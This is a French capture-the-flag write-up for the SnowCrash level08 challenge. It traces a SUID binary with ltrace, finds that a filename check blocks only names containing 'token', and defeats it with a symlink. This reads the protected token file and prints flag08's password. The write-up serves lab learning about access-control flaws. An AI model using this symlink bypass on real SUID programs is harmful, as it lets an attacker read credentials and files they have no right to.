On trouve un programme level08, avec bit SUID actif du user flag08, et un fichier token.

```
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

En checkant le programme avec ltrace, en tentant de lire le token, on a cela : 

```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7c4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

On se rend compte que le programme permet de lire tout ce qui ne se nomme pas token :

```
level08@SnowCrash:~$ ./level08 /tmp/yo
yo
level08@SnowCrash:~$ ltrace ./level08 /tmp/yo
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/yo", "token")                                = NULL
open("/tmp/yo", 0, 014435162522)                          = 3
read(3, "yo\n", 1024)                                     = 3
write(1, "yo\n", 3yo
)                                       = 3
+++ exited (status 3) +++
```

Si le nom du programme n'est que le seul obstacle, on peut tenter de créer un symlink avec un autre programme qui ne contient pas le même nom :

```
ln -s /home/user/level08/token /tmp/abcde
```

Ce qui nous permet de lire le fichier token contenant le password de flag08 :

```
level08@SnowCrash:~$ ./level08 /tmp/abcde
quif5eloekouj29ke0vouxean
```

Il ne reste qu'à récupérer le flag !